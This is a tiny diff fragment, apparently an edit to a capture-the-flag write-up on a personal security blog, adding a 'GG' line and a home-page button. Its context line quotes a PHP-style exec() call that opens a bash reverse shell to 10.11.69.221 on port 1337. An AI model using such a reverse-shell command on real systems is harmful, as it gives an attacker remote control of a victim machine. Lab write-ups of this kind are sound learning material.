@@ -113,5 +113,7 @@ exec("/bin/bash -c 'bash -i > /dev/tcp/10.11.69.221/1337 0>&1'");
 ![](https://i.imgur.com/7hcHGRz.png)
 
 
+GG
 
+<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>
 
